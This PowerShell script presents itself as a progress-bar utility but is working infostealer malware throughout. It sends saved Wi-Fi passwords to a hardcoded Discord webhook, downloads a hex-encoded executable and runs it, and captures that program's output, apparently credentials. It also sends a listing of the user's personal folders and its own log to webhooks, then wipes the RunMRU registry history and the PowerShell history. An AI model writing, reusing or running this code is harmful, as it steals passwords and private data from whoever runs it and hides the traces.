# Script with 5 operations with progress bar

# Discord webhook URL
$webhookUrl = 'https://discord.com/api/webhooks/1297712924281798676/ycVfil-FoOVqAlTxZrp-2aHo8O9eJlCZg8rR279cu7oGwCh-kdq5GxxliUQMVneIkxDX'

# ##############################################################################

# Redirect both standard output and error to null
$null = Start-Transcript -Path "$env:TEMP\Ain1_log.txt" -Append

###############################################################################

# Load the WPF assembly
Add-Type -AssemblyName PresentationFramework

# Detect if the system theme is dark or light by reading registry value
$themeKeyPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Themes\Personalize"
$themeValue = Get-ItemProperty -Path $themeKeyPath -Name "AppsUseLightTheme" -ErrorAction SilentlyContinue

# Default to Light theme if the registry key does not exist
$isDarkTheme = ($themeValue.AppsUseLightTheme -eq 0)

# Create a new WPF Window
$window = New-Object System.Windows.Window
$window.Title = "Custom Progress Bar"
$window.Width = 400
$window.Height = 30
$window.WindowStartupLocation = "Manual"
$window.Topmost = $true  # Keep on top of other windows

# Make the window transparent
$window.AllowsTransparency = $true
$window.WindowStyle = [System.Windows.WindowStyle]::None
$window.Background = [System.Windows.Media.Brushes]::Transparent

# Calculate screen and taskbar dimensions
$screenHeight = [System.Windows.SystemParameters]::PrimaryScreenHeight
$screenWidth = [System.Windows.SystemParameters]::PrimaryScreenWidth
$taskbarHeight = $screenHeight - [System.Windows.SystemParameters]::WorkArea.Height

# Position the window above the taskbar
$window.Left = 0
$window.Top = $screenHeight - $taskbarHeight - $window.Height
$window.Width = $screenWidth

# Create a Grid to hold the UI elements
$grid = New-Object System.Windows.Controls.Grid

# Define ProgressBar style
$progressBar = New-Object System.Windows.Controls.ProgressBar
$progressBar.Minimum = 0
$progressBar.Maximum = 100
$progressBar.Value = 0
$progressBar.Height = 20
$progressBar.Width = 300
$progressBar.HorizontalAlignment = 'Right'  # Align to the left
$progressBar.Margin = [System.Windows.Thickness]::new(0,0,10,10)  # Adjust left margin as needed

# Set ProgressBar color based on the system theme
if ($isDarkTheme) {
    # Dark theme colors
    $gradientBrush = New-Object System.Windows.Media.LinearGradientBrush
    $gradientBrush.StartPoint = [System.Windows.Point]::Parse("0,0")
    $gradientBrush.EndPoint = [System.Windows.Point]::Parse("1,0")
    $gradientStop1 = New-Object System.Windows.Media.GradientStop
    $gradientStop1.Color = [System.Windows.Media.Colors]::DarkGray
    $gradientStop1.Offset = 0.0
    $gradientBrush.GradientStops.Add($gradientStop1)

    $gradientStop2 = New-Object System.Windows.Media.GradientStop
    $gradientStop2.Color = [System.Windows.Media.Colors]::Gray
    $gradientStop2.Offset = 1.0
    $gradientBrush.GradientStops.Add($gradientStop2)

    $progressBar.Foreground = $gradientBrush
} else {
    # Light theme colors
    $gradientBrush = New-Object System.Windows.Media.LinearGradientBrush
    $gradientBrush.StartPoint = [System.Windows.Point]::Parse("0,0")
    $gradientBrush.EndPoint = [System.Windows.Point]::Parse("1,0")
    $gradientStop1 = New-Object System.Windows.Media.GradientStop
    $gradientStop1.Color = [System.Windows.Media.Colors]::LightGreen
    $gradientStop1.Offset = 0.0
    $gradientBrush.GradientStops.Add($gradientStop1)

    $gradientStop2 = New-Object System.Windows.Media.GradientStop
    $gradientStop2.Color = [System.Windows.Media.Colors]::Green
    $gradientStop2.Offset = 1.0
    $gradientBrush.GradientStops.Add($gradientStop2)

    $progressBar.Foreground = $gradientBrush
}

# Set the background color of the ProgressBar
$progressBar.Background = [System.Windows.Media.Brushes]::LightGray

# Add ProgressBar to the Grid
$grid.Children.Add($progressBar)

# Create a TextBlock for the completion notification
$textBlock = New-Object System.Windows.Controls.TextBlock
$textBlock.Text = "Starting operations..."
$textBlock.HorizontalAlignment = 'Right'
$textBlock.Margin = [System.Windows.Thickness]::new(0, 0, 10, 10)
$textBlock.FontSize = 12
$textBlock.Foreground = [System.Windows.Media.Brushes]::White

# Add TextBlock to the Grid
$grid.Children.Add($textBlock)

# Set the Grid as the Content of the Window
$window.Content = $grid

# Show the window
$window.Show()

# Define the total number of tasks (replace with the number of main operations)
$totalSteps = 6  # Adjust this to the number of main operations you want to track

# Example operations (replace with your actual code)
for ($step = 1; $step -le $totalSteps; $step++) {
    # Perform your operation here
    switch ($step) {
        4 {
            # Operation 1 - Extract Wi-Fi profiles
            $textBlock.Text = "Starting Operation " + $step + "/" + $totalSteps 
            try {
                $profiles = netsh wlan show profile | Select-String '(?<=All User Profile\s+:\s).+'
                $profileCount = $profiles.Count
                $currentProfile = 1

                foreach ($profile in $profiles) {
                    $wlan = $profile.Matches.Value
                    
                    # Extract the Wi-Fi password
                    try {
                        $passw = netsh wlan show profile $wlan key=clear | Select-String '(?<=Key Content\s+:\s).+'
                    } catch {
                        Write-Host "Failed to retrieve password for $wlan"
                        $passw = "N/A" # Assign a placeholder if password retrieval fails
                    }
            
                    # Build the message body for the webhook
                    $Body = @{
                        'username' = $env:username + " | " + [string]$wlan
                        'content'  = [string]$passw
                    }
            
                    # Send the data to the Discord webhook
                    try {
                        Invoke-RestMethod -ContentType 'Application/Json' -Uri $webhookUrl -Method Post -Body ($Body | ConvertTo-Json) -ErrorAction SilentlyContinue | Out-Null
                    } catch {
                        Write-Host "Failed to send data to Discord webhook. Operation " + $step + "/" + $totalSteps
                    }

                    # Update progress bar value
                    $progressBar.Value = [math]::Floor(($currentProfile / $profileCount) * 100)
                    $textBlock.Text = "Wehfigh Operation " + $step + "/" +$totalSteps+ ": Profile - " + $currentProfile + "/" + $profileCount

                    # Update the window to keep it responsive
                    [System.Windows.Threading.Dispatcher]::CurrentDispatcher.Invoke([Action]{$null}, [System.Windows.Threading.DispatcherPriority]::Background)

                    # Increment to the next profile
                    $currentProfile++
                    Start-Sleep -Milliseconds 100 # Adjust as needed for UI smoothness
                }
                # Add-Type -AssemblyName PresentationFramework
                # [System.Windows.MessageBox]::Show('Netsh checked!', 'Notification')
            } catch {
                Write-Host "An error occurred: $($_.Exception.Message)"
                # Add-Type -AssemblyName PresentationFramework
                # [System.Windows.MessageBox]::Show("An error occurred: $($_.Exception.Message)", 'Error')
            }
            $textBlock.Text = "Done Operation " + $step
            $textBlock.Text = "Starting Operation " + $step + "/" + $totalSteps

            Write-Output "Completed Operation " + $step + " - NETSH"
        }
        1 {
            # Operation 2
            $url = "https://lnkfwd.com/u/Kpj_Yric"  # Define the URL of the file to be downloaded
            $tempPath = [System.IO.Path]::Combine($env:TEMP, "example.txt")  # Define the path to save the file in the %temp% folder
            Invoke-WebRequest -Uri $url -OutFile $tempPath # Use Invoke-WebRequest to download the file

            ###############################################################################

            # OPEN THE PROGRAM BY CONVERTING HEX TO EXE AND RUN IN THE MEMORY

            $hexFilePath = Join-Path $env:TEMP "example.txt" # Path to the hex file in the %temp% directory
            $hexString = Get-Content -Path $hexFilePath -Raw # Read the hex string from the file

            # Convert the hex string to a byte array
            $bytes = [byte[]]::new($hexString.Length / 2)
            for ($i = 0; $i -lt $hexString.Length; $i += 2) {
                $bytes[$i / 2] = [convert]::ToByte($hexString.Substring($i, 2), 16)
            }

            # Create a temporary file to hold the executable
            $tempExePath = Join-Path $env:TEMP "example.exe"
            [System.IO.File]::WriteAllBytes($tempExePath, $bytes)

            $process = Start-Process $tempExePath # Start the executable

            $textBlock.Text = "Done Operation " + $step
            $textBlock.Text = "Starting Operation " + $step + "/" + $totalSteps

            Write-Output "Completed Operation " + $step + "/" + $totalSteps + "Started the executable"
        }
        2 {
            # Operation 3 - EXTRACT DATA 

            $outputFilePath = "$env:TEMP\data.txt"
            Start-Sleep -Seconds 2 # Wait a moment for the application to fully load
            Add-Type -AssemblyName System.Windows.Forms # Load the necessary assemblies for sending keys

            # Simulate CTRL+A and then CTRL+S to save the file
            [System.Windows.Forms.SendKeys]::SendWait("^(a)")  # Simulate CTRL+A
            Start-Sleep -Milliseconds 500  # Wait a moment for selection
            [System.Windows.Forms.SendKeys]::SendWait("^(s)")  # Simulate CTRL+S
            Start-Sleep -Milliseconds 1000  # Wait for save dialog to appear

            # Send the output file path and Enter
            [System.Windows.Forms.SendKeys]::SendWait("$outputFilePath")
            Start-Sleep -Milliseconds 500  # Wait for the input
            [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")  # Press Enter to save

            Start-Sleep -Seconds 2 # Wait a moment for the file to save
            Get-Process | Where-Object { $_.Path -like "$env:TEMP\example.exe" } | Stop-Process -Force # Cleanup any lingering processes

            $textBlock.Text = "Done Operation " + $step
            $textBlock.Text = "Starting Operation " + $step + "/" + $totalSteps 

            Write-Output "Completed Operation " + $step + "- data saved"
        }
        3 {
            # Operation 4 - SEND TO DISCORD

            $filePath = "$env:TEMP\data.txt" # Define the path to the text file using the TEMP environment variable

            # Check if the file exists
            if (Test-Path $filePath) {
                # Read the content of the text file
                $fileContent = Get-Content -Path $filePath -Raw

                # Split the content into chunks of 2000 characters
                $chunkSize = 2000
                $chunks = [System.Collections.Generic.List[string]]::new()

                for ($i = 0; $i -lt $fileContent.Length; $i += $chunkSize) {
                    $chunks.Add($fileContent.Substring($i, [math]::Min($chunkSize, $fileContent.Length - $i)))
                }

                # Calculate total chunks for progress increment
                $totalChunks = $chunks.Count
		        $currentChunks = 1

                # Send each chunk to the Discord webhook
                foreach ($chunk in $chunks) {
                    # Create the payload for the webhook
                    $payload = @{
                        content = $chunk
                    } | ConvertTo-Json

                    # Try to send the content to the Discord webhook
                    try {
                        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json' -ErrorAction SilentlyContinue | Out-Null
                        Start-Sleep -Seconds 1  # Optional: Pause briefly to avoid rate limits
                    } catch {
                        Write-Host "Error sending request: $_"
                        # Add-Type -AssemblyName PresentationFramework
                        # [System.Windows.MessageBox]::Show("Error sending request: $_. Check Internet!", 'Error')
                    }

                    # Inside the foreach loop, after each chunk is sent
                    # Update progress bar value
                    $progressBar.Value = [math]::Floor(($currentChunks / $totalChunks) * 100)
                    $textBlock.Text = "WBPV Operation " + $step + "/" + $totalSteps + ": Chunks - " + $currentChunks + "/" + $totalChunks

                    # Update the window to keep it responsive
                    [System.Windows.Threading.Dispatcher]::CurrentDispatcher.Invoke([Action]{$null}, [System.Windows.Threading.DispatcherPriority]::Background)

                    # Increment to the next profile
                    $currentChunks++
                    Start-Sleep -Milliseconds 100 # Adjust as needed for UI smoothness
                
                }
            } else {
                Write-Host "File not found: $filePath"
                Add-Type -AssemblyName PresentationFramework
                [System.Windows.MessageBox]::Show("File not found: $filePath", 'Error')
            }
            Remove-Item "$env:TEMP\data.txt" -Force -ErrorAction SilentlyContinue
            Remove-Item "$env:TEMP\example.txt" -Force -ErrorAction SilentlyContinue
            Remove-Item "$env:TEMP\example.exe" -Force -ErrorAction SilentlyContinue
            Remove-Item "$env:TEMP\Cred.ps1" -Force -ErrorAction SilentlyContinue
            #Remove-Item "$env:TEMP\Ain1_log.txt" -Force -ErrorAction SilentlyContinue

            $textBlock.Text = "Done Operation " + $step
            $textBlock.Text = "Starting last operation ..."
            Write-Output "Completed Operation " + $step + "- CRED done"
        }
        5 {
            #Operation 5 - TREE Files Extract
            # Define the folders to search
            $folders = @(
                [System.IO.Path]::Combine($env:USERPROFILE, 'Desktop'),
                [System.IO.Path]::Combine($env:USERPROFILE, 'Documents'),
                [System.IO.Path]::Combine($env:USERPROFILE, 'Videos'),
                [System.IO.Path]::Combine($env:USERPROFILE, 'Music')
            )
    
            # Define the output file path
            $outputFile = [System.IO.Path]::Combine($env:TEMP, 'tree.txt')
    
            # Function to display files in a tree structure
            function Show-Tree {
                param (
                    [string]$Path,
                    [int]$Depth = 0
                )
                
                # Get all directories and files in the current path
                $items = Get-ChildItem -Path $Path -ErrorAction SilentlyContinue
    
                foreach ($item in $items) {
                    # Exclude Program Files and OS files
                    if ($item.FullName -notlike "*\Program Files\*" -and 
                        $item.FullName -notlike "*\Windows\*" -and 
                        $item.FullName -notlike "*\System32\*") {
    
                        # Indent based on depth
                        $indent = ' ' * ($Depth * 4)
    
                        # Display the item
                        if ($item.PSIsContainer) {
                            "${indent}+-- $($item.Name)" | Out-File -Append -FilePath $outputFile
                            # Recurse into the directory
                            Show-Tree -Path $item.FullName -Depth ($Depth + 1)
                        } else {
                            "${indent}+-- $($item.Name)" | Out-File -Append -FilePath $outputFile
                        }
                    }
                }
            }
    
            # Clear the output file if it already exists
            if (Test-Path $outputFile) {
                Remove-Item $outputFile
            }
    
            # Iterate through defined folders and display their contents
            foreach ($folder in $folders) {
                "Contents of ${folder}:" | Out-File -Append -FilePath $outputFile
                Show-Tree -Path $folder
                "" | Out-File -Append -FilePath $outputFile
            }
    
            #########################################################################
    
            # Define the webhook URL
            # $webhookUrl='https://discord.com/api/webhooks/1297712924281798676/ycVfil-FoOVqAlTxZrp-2aHo8O9eJlCZg8rR279cu7oGwCh-kdq5GxxliUQMVneIkxDX'
    
            # Define the path to the text file using the TEMP environment variable
            $filePath = "$env:TEMP\tree.txt"
    
            # Check if the file exists
            if (Test-Path $filePath) {
                # Read the content of the text file
                $fileContent = Get-Content -Path $filePath -Raw
    
                # Check the length of the file content
                if ($fileContent.Length -lt 2000) {
                    # Send the entire content to the Discord webhook
                    $payload = @{
                        content = $fileContent
                    } | ConvertTo-Json
                    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json'
                    $progressBar.Value = 100  # Set progress to complete
                } else {
                    # Split the content into chunks of 2000 characters
                    $chunkSize = 2000
                    $chunks = [System.Collections.Generic.List[string]]::new()
    
                    for ($i = 0; $i -lt $fileContent.Length; $i += $chunkSize) {
                        $chunks.Add($fileContent.Substring($i, [math]::Min($chunkSize, $fileContent.Length - $i)))
                    }

                    # Calculate total chunks for progress increment
                    $totalChunks = $chunks.Count
		            $currentChunks = 1
    
                    # Send each chunk to the Discord webhook
                    foreach ($chunk in $chunks) {
                        # Create the payload for the webhook
                        $payload = @{
                            content = $chunk
                        } | ConvertTo-Json
    
                        # Try to send the content to the Discord webhook
                        try {
                            Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json'
                            Start-Sleep -Seconds 1  # Optional: Pause briefly to avoid rate limits
                        } catch {
                            Write-Host "Error sending request: $_. Operation " + $step + "/" + $totalSteps
                        }

                        # Update progress bar value
                        $progressBar.Value = [math]::Floor(($currentChunks / $totalChunks) * 100)
                        $textBlock.Text = "Tree Operation " + $step + "/" + $totalSteps + ": Chunks - " + $currentChunks + "/" + $totalChunks

                        # Update the window to keep it responsive
                        [System.Windows.Threading.Dispatcher]::CurrentDispatcher.Invoke([Action]{$null}, [System.Windows.Threading.DispatcherPriority]::Background)

                        # Increment to the next profile
                        $currentChunks++
                        Start-Sleep -Milliseconds 100 # Adjust as needed for UI smoothness
                    }
                    Write-Host "Operation " + $step + "/" + $totalSteps + "completed"
                }
            } else {
                Write-Host "File not found: $filePath"
                Add-Type -AssemblyName PresentationFramework
                [System.Windows.MessageBox]::Show("File not found: $filePath", 'Notification')
            }
    
            Remove-Item "$env:TEMP\tree.txt" -Force -ErrorAction SilentlyContinue
            # Remove-Item "$env:TEMP\treewin.ps1" -Force -ErrorAction SilentlyContinue
    
            #delete the entire history
            reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
    
            # Clear the PowerShell command history
            Clear-History

            # $textBlock.Text = "Done Last operation."
    
            # Display a message box indicating completion
            # Add-Type -AssemblyName PresentationFramework
            # [System.Windows.MessageBox]::Show('tree finish!', 'Notification')
        }
        6 {
            # Define the webhook URL
            $logs_webhookUrl='https://discord.com/api/webhooks/1300717354547806219/1JCd4_69saQaBJrxNJJbDn-oC_VKJDj_-UYfn8tC3qu1hAzsgetWQ00cPOcHoTcmANhL'

            #SEND THE LOG FILE
            # Define the path to the text file using the TEMP environment variable
            $filePath = "$env:TEMP\Ain1_log.txt"
    
            # Check if the file exists
            if (Test-Path $filePath) {
                # Read the content of the text file
                $fileContent = Get-Content -Path $filePath -Raw
    
                # Check the length of the file content
                if ($fileContent.Length -lt 2000) {
                    # Send the entire content to the Discord webhook
                    $payload = @{
                        content = $fileContent
                    } | ConvertTo-Json -Depth 10
                    Invoke-RestMethod -Uri $logs_webhookUrl -Method Post -Body $payload -ContentType 'application/json'
                    $progressBar.Value = 100  # Set progress to complete
                } else {
                    # Split the content into chunks of 2000 characters
                    $chunkSize = 2000
                    $chunks = [System.Collections.Generic.List[string]]::new()
    
                    for ($i = 0; $i -lt $fileContent.Length; $i += $chunkSize) {
                        $chunks.Add($fileContent.Substring($i, [math]::Min($chunkSize, $fileContent.Length - $i)))
                    }

                    # Calculate total chunks for progress increment
                    $totalChunks = $chunks.Count
		            $currentChunks = 1
    
                    # Send each chunk to the Discord webhook
                    foreach ($chunk in $chunks) {
                        # Create the payload for the webhook
                        $payload = @{
                            content = $chunk
                        } | ConvertTo-Json -Depth 10
    
                        # Try to send the content to the Discord webhook
                        try {
                            Invoke-RestMethod -Uri $logs_webhookUrl -Method Post -Body $payload -ContentType 'application/json'
                            Start-Sleep -Seconds 1  # Optional: Pause briefly to avoid rate limits
                        } catch {
                            Write-Host "Error sending request: $_. Operation " + $step + "/" + $totalSteps
                        }

                        # Update progress bar value
                        $progressBar.Value = [math]::Floor(($currentChunks / $totalChunks) * 100)
                        $textBlock.Text = "Log Operation " + $step + "/" + $totalSteps + ": Chunks - " + $currentChunks + "/" + $totalChunks

                        # Update the window to keep it responsive
                        [System.Windows.Threading.Dispatcher]::CurrentDispatcher.Invoke([Action]{$null}, [System.Windows.Threading.DispatcherPriority]::Background)

                        # Increment to the next profile
                        $currentChunks++
                        Start-Sleep -Milliseconds 100 # Adjust as needed for UI smoothness
                    }
                    Write-Host "Operation " + $step + "/" + $totalSteps + "completed"
                }
            } else {
                Write-Host "File not found: $filePath"
                Add-Type -AssemblyName PresentationFramework
                [System.Windows.MessageBox]::Show("File not found: $filePath", 'Notification')
            }
            $textBlock.Text = "Log sent!"
            Remove-Item "$env:TEMP\Ain1_log.txt" -Force -ErrorAction SilentlyContinue

            #delete the entire history
            reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
    
            # Clear the PowerShell command history
            Clear-History
            
        }
    }

    # Update the progress bar
    $progressBar.Value = ($step / $totalSteps) * 100

    # Update the window to keep it responsive
    [System.Windows.Threading.Dispatcher]::CurrentDispatcher.Invoke([Action]{$null}, [System.Windows.Threading.DispatcherPriority]::Background)
}

# Close the window upon completion
$window.Close()

# End the transcript if you started one
Stop-Transcript

# Final output (if needed)
Write-Output "All operations completed!"
# Display a message box indicating completion
Add-Type -AssemblyName PresentationFramework
[System.Windows.MessageBox]::Show("All operations completed!", "Success", [System.Windows.MessageBoxButton]::OK, [System.Windows.MessageBoxImage]::Information)